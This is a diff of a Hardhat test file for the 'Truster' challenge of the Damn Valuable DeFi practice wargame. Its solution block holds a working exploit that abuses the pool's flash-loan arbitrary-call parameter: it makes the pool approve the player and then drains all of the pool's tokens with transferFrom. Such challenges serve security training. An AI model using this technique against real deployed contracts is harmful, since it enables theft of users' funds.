@@ -1,44 +1,50 @@
-const { ether } = require('@openzeppelin/test-helpers');
-const { accounts, contract } = require('@openzeppelin/test-environment');
-
-const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
-const TrusterLenderPool = contract.fromArtifact('TrusterLenderPool');
-
+const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
 describe('[Challenge] Truster', function () {
+    let deployer, player;
+    let token, pool;
 
-    const [deployer, attacker, ...otherAccounts] = accounts;
-
-    const TOKENS_IN_POOL = ether('1000000');
+    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;
 
     before(async function () {
-        /** SETUP SCENARIO */
-        this.token = await DamnValuableToken.new({ from: deployer });
-        this.pool = await TrusterLenderPool.new(this.token.address, { from: deployer });
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        [deployer, player] = await ethers.getSigners();
 
-        await this.token.transfer(this.pool.address, TOKENS_IN_POOL, { from: deployer });
+        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
+        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
+        expect(await pool.token()).to.eq(token.address);
 
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.be.bignumber.equal(TOKENS_IN_POOL);
+        await token.transfer(pool.address, TOKENS_IN_POOL);
+        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);
 
-        expect(
-            await this.token.balanceOf(attacker)
-        ).to.be.bignumber.equal('0');
+        expect(await token.balanceOf(player.address)).to.equal(0);
     });
 
-    it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        const tokenIface = new ethers.utils.Interface([
+          "function approve(address spender, uint256 amount)",
+          "function transferFrom(address from, address to, uint256 amount)"
+        ]);
+        let encodedCall = tokenIface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
+        await pool.connect(player).flashLoan(0, player.address, token.address, encodedCall);
+        console.log("allowance: ", await token.allowance(pool.address, player.address));
+
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
+        
     });
 
     after(async function () {
-        /** SUCCESS CONDITIONS */
+        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+
+        // Player has taken all tokens from the pool
         expect(
-            await this.token.balanceOf(attacker)
-        ).to.be.bignumber.equal(TOKENS_IN_POOL);        
+            await token.balanceOf(player.address)
+        ).to.equal(TOKENS_IN_POOL);
         expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.be.bignumber.equal('0');
+            await token.balanceOf(pool.address)
+        ).to.equal(0);
     });
 });
+
